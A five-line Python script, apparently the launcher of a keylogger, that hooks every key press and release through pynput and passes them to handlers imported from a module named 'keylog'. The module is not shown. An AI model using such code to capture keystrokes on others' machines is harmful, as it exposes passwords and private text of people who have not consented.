from pynput.keyboard import Listener

from keylog import key_press, key_release

with Listener(on_press = key_press, on_release = key_release) as listener:
	listener.join()
